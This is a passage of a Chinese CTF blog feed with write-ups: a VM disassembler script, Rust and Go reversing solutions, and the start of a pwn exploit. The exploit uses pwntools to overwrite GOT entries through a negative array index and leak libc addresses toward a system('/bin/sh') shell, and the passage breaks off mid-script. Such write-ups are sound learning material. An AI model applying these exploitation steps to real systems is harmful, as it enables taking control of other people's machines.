number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>​     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"shr reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmp reg[0],reg[1]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre></pre></td></tr><tr><td data-num=\"169\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">jmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>   <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"172\"></td><td><pre></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>   <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"jmp </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>   ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">jne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"180\"></td><td><pre></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"jne </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre></pre></td></tr><tr><td data-num=\"185\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">je</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"188\"></td><td><pre></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"je </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token keyword\">while</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">255</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>​       mov<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>​       push<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>​       pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>​      alu<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>​      <span class=\"token builtin\">cmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>​      jmp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>​      jne<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>​      je<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行结果</p>\n<p><img data-src=\"/images/image-20230213195038779.png\" alt=\"image.png\"></p>\n<p>首先 data [0] 到 data [39] 共 40 个数据为输入的 flag  分析这 39 行汇编知操作为:</p>\n<p>可看出逻辑为加 data [50+i]，异或 data [100+i]，左移 8 位 + 右移 8 位，并与 data [150+i] 逆序（因为加密后结果存放在栈中）进行比较，写解密代码即可:</p>\n<p><img data-src=\"/images/image-20230213195738789.png\" alt=\"image.png\"></p>\n<p>总结:</p>\n<p>这里方法是手写反汇编器还原虚拟机的指令 算是比较严谨的做法了顺便学习 VM 的基础吧 貌似可以动态调试来做？</p>\n<p>虚拟机题型的关键在于分析出来虚拟机的数据结构，如寄存器，栈，内存等。在分析过程中能把寄存器在 IDA 中表示出来是最好的 (方便看，如题中分析出是结构体), 要把关键寄存器如 rip 先分析出来</p>\n<p>题中<s> input</s> (也就是脚本中的 data) 那个大数组其实就相当于栈，内存这种类似的存在了 就是一个空间</p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/04/N1CTF%20Junior%20%20WP%20%20by%203cly/",
            "url": "https://3cly.github.io/2023/02/04/N1CTF%20Junior%20%20WP%20%20by%203cly/",
            "title": "N1CTF Junior  WP",
            "date_published": "2023-02-04T05:02:58.000Z",
            "content_html": "<h1 id=\"n1ctf-junior-wp\"><a class=\"markdownIt-Anchor\" href=\"#n1ctf-junior-wp\">#</a> N1CTF Junior  WP</h1>\n<h2 id=\"reserve\"><a class=\"markdownIt-Anchor\" href=\"#reserve\">#</a> reserve</h2>\n<h3 id=\"checkin-rs\"><a class=\"markdownIt-Anchor\" href=\"#checkin-rs\">#</a> checkin-rs</h3>\n<h4 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h4>\n<p>拿到文件 由题目标题知是 rust 语言编写的 之前没接触过 rust 的逆向题只好硬着头皮先放进 IDA 看看<br>\n<img data-src=\"/images/n1.png\" alt=\"image.png\"><br>\n 首先搜索 main 函数 找到这个带有字符串的函数就是主函数了<br>\n<img data-src=\"/images/n2.png\" alt=\"image.png\"><br>\nv0 先是赋值了 32 字节 又 cpy 了 14 字节 总共是 46 字节 通过动调和 lazyIDA 可提取出来<br>\n [0x7D, 0x20, 0x23, 0x22, 0x25, 0x24, 0x68, 0x72, 0x6E, 0x56, 0x79, 0x62, 0x53, 0x79, 0x7D, 0x7A, 0x62, 0x4E, 0x7C, 0x7A, 0x7F, 0x76, 0x73, 0x7F, 0x7B, 0x46, 0x7F, 0x68, 0x6E, 0x78, 0x68, 0x7A, 0x52, 0x7E, 0x5B, 0x50, 0x45, 0x40, 0x5D, 0x4C, 0x46, 0x5C, 0x5A, 0x48, 0x49, 0x5E]<br>\n 最后面这部分应该对解题帮助不大 就是判断输入之后的成功或失败 然后释放前面使用的内存什么的<br>\n<img data-src=\"/images/n3.png\" alt=\"image.png\"></p>\n<p>中间部分的前面是有关线程使用的一些判断，正常情况没有报错就不会执行<br>\n<img data-src=\"/images/n4.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n5.png\" alt=\"image.png\"><br>\n 后面的多线程就是关键了<br>\n<img data-src=\"/images/n6.png\" alt=\"image.png\"><br>\n 对这部分 我昨天动态调试了很久没有看懂 然后 hint1 放出来了 于是去 rust 官网下载了 rust 在 VScode 上编译了一个多线程 rust 程序放进 IDA 看看 要能找到线程 handler 就能找到关键<br>\n<img data-src=\"/images/n7.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n8.png\" alt=\"image.png\"> 然后查看 main 函数就发现 sub_1400027B0 是 main 函数 sub_140002EB0 就是 handler 相关的<br>\n这时准备开摆了 放出了第二个 hint 叫我们在 bcmp 函数下断点观察输入的变化 就是黑盒分析吧<br>\n<img data-src=\"/images/n9.png\" alt=\"image.png\"><br>\nv23 是加密后的输入<br>\n通过很多次尝试 (比如输入 46 个 1，16 个 1 后面是 2，secpunk {},secpunk {11111} 之类的)<br>\n<img data-src=\"/images/n10.png\" alt=\"image.png\"><br>\n 发现输入的字符串加密后最后一个字符经过加密后是不变的<br>\n<img data-src=\"/images/n11.png\" alt=\"image.png\"><br>\n 发现前面的 v26 就是输入  v25 是加密后的数据 v24 又递加<br>\n<img data-src=\"/images/n12.png\" alt=\"image.png\"><br>\n 最后一个字符没变就是异或 0 于是就试了 0-45 的异或比较数据 直接得出 flag</p>\n<h4 id=\"脚本\"><a class=\"markdownIt-Anchor\" href=\"#脚本\">#</a> 脚本</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>kkk<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token operator\">=</span>kkk</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    kkk<span class=\"token operator\">=</span>kkk<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token builtin\">str</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#因为 lazyIDA 提取数据的原因前面异或之后是倒序后面再倒过来</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''运行结果:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>46</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>[125, 33, 33, 33, 33, 33, 110, 117, 102, 95, 115, 105, 95, 116, 115, 117,</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>114, 95, 110, 105, 107, 99, 101, 104, 99, 95, 101, 115, 114, 101, 118, 101,</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>114, 95, 121, 115, 97, 101, 123, 107, 110, 117, 112, 99, 101, 115]</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>secpunk&#123;easy_reverse_checkin_rust_is_fun!!!!!&#125;</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Process finished with exit code 0</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>'''</pre></td></tr></table></figure><h2 id=\"n0th1ngg0\"><a class=\"markdownIt-Anchor\" href=\"#n0th1ngg0\">#</a> n0th1ngG0</h2>\n<h3 id=\"题目分析-2\"><a class=\"markdownIt-Anchor\" href=\"#题目分析-2\">#</a> 题目分析</h3>\n<p n1_jun10r_2023_1s_4w3s0m3>开始做的时候附件已经更新过了 直接下载的简单版本<br>\n同时题目描述说了如果认识这个算法就直接冲 推测应该是某种加密算法<br>\n 2 个版本我直接把 windows 版放进 IDA<br>\n<img data-src=\"/images/n13.png\" alt=\"image.png\"><br>\n 这里注意 go 语言逆向题 main 函数是 main_main<br>\n<img data-src=\"/images/n14.png\" alt=\"image.png\"><br>\n 关键就是中间的 main_crypto_Crypt 了 这里发现了 2 段常量字符数组 一段为密钥一段为比较数据<br>\n<img data-src=\"/images/n15.png\" alt=\"image.png\"><br>\n<img data-src=\"/images/n16.png\" alt=\"image.png\"><br>\n 点开是 2 个 WTF 函数充斥着 RC4 算法的特征 这时候还没细看 直接动态调试提取 key 试试原版 RC4 (感觉一般 RC4 不会魔改吧)<br>\n<img data-src=\"/images/n17.png\" alt=\"image.png\"><br>\n 前面对 key 有个循环处理不用管 直接提取处理后的 <strong>secpunk:</strong><br>\n<img data-src=\"/images/n18.png\" alt=\"image.png\"><br>\nRC4 为对称加密 把比较数据转换为 hex 字符串然后 RC4 就能得到 flag<br>\n<img data-src=\"/images/n19.png\" alt=\"image.png\"><br>\nsecpunk</p>\n<p>成功 get flag</p>\n",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/02/04/hgame2023%20%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://3cly.github.io/2023/02/04/hgame2023%20%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "hgame2023 部分做题记录",
            "date_published": "2023-02-04T05:02:58.000Z",
            "content_html": "<h1 id=\"hgame2023-部分题记录\"><a class=\"markdownIt-Anchor\" href=\"#hgame2023-部分题记录\">#</a> hgame2023 部分题记录</h1>\n<p>做的主要是二进制 杂项做了一些 然后做了一道 IOT 有关 MQTT 的 50 分的题 一道 web 签到题 (打开页面源码就有那种)</p>\n<p>记录了一些个人认为需要记录的题</p>\n<h2 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h2>\n<h3 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h3>\n<h4 id=\"choose_the_seat\"><a class=\"markdownIt-Anchor\" href=\"#choose_the_seat\">#</a> choose_the_seat</h4>\n<p><img data-src=\"/images/image-20230129183211218.png\" alt=\"image.png\"></p>\n<p>IDA 中查看 没有后门函数 没有 bin/sh 字符串 认为和 ret2libc 有关可能要泄漏 got 表</p>\n<p><img data-src=\"/images/image-20230129183939209.png\" alt=\"image.png\"></p>\n<p>检查保护，只开了 nx 保护 (No-eXecute, 不可执行保护） RELRO 为 Partial RELRO 也就是说 got 表可以修改</p>\n<h5 id=\"relro保护补充\"><a class=\"markdownIt-Anchor\" href=\"#relro保护补充\">#</a> <strong>RELRO 保护补充</strong></h5>\n<p>在 Linux 中有两种 RELRO 模式： <code>Partial RELRO</code>  和  <code>Full RELRO</code> 。Linux 中 <code>Partical RELRO</code>  默认开启。如果开启  <code>FUll RELRO</code> ，意味着我们无法修改 got 表，这样也就没法通过修改 GOT 表来进行 <strong>Return-to-libc</strong> 攻击</p>\n<p>hint 是数组越界，通过查找资料发现</p>\n<h5 id=\"数组越界\"><a class=\"markdownIt-Anchor\" href=\"#数组越界\">#</a> 数组越界</h5>\n<p>所谓的数组越界，简单地讲就是指数组下标变量的取值超过了初始定义时的大小，导致对数组元素的访问出现在数组的范围之外，这类错误也是 C 语言程序中最常见的错误之一。</p>\n<p>在 C 语言中，数组必须是静态的。换而言之，数组的大小必须在程序运行前就确定下来。由于 C 语言并不具有类似 Java  等语言中现有的静态分析工具的功能，可以对程序中数组下标取值范围进行严格检查，一旦发现数组上溢或下溢，都会因抛出异常而终止程序。也就是说，C  语言并不检验数组边界，数组的两端都有可能越界，从而使其他变量的数据甚至程序代码被破坏。</p>\n<p>我们可以用数组越界漏洞，将 got 表里 printf 函数的地址修改成 system（‘/bin/sh’”）的地址，那么程序在之后调用 printf 函数时，实际上调用的是函数 system（‘/bin/sh’”），这样我们就获得了目标主机的控制权限。</p>\n<p><img data-src=\"/images/image-20230129192048928.png\" alt=\"image.png\"></p>\n<p>这里有个 if (v0&gt;9) 退出 而若要数组越界 v0==10 所以考虑 v0 为负数产生越界</p>\n<p>seats 是储存在 bss 中，可以反向越界修改 got 表</p>\n<p>根据 got 表中的偏移可以计算出用到的下标的大小</p>\n<p>泄漏 got 表 之前我还没看偏移 纯动态调试…🙁</p>\n<p><img data-src=\"/images/image.png\" alt=\"image.png\"></p>\n<p>-10 之后 覆盖到这里了！！！</p>\n<p><img data-src=\"/images/123.png\" alt=\"image.png\"></p>\n<p>-9 覆盖到 put</p>\n<p><strong>-7 是 read</strong></p>\n<p><img data-src=\"/images/7778.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230130002855289.png\" alt=\"image.png\"></p>\n<p><strong>偏移计算得 - 6 覆盖到 exit 退出函数</strong></p>\n<p>开始写 EXP</p>\n<p><strong>第一步</strong>：通过修改 exit 函数的 got 表为 start 让程序反复执行</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#['vuln']</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#反复执行</span></pre></td></tr></table></figure><p><strong>第二步</strong>：泄漏 read 地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\xc0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#让后面的 puts 泄露 read 真实地址</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>read_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token 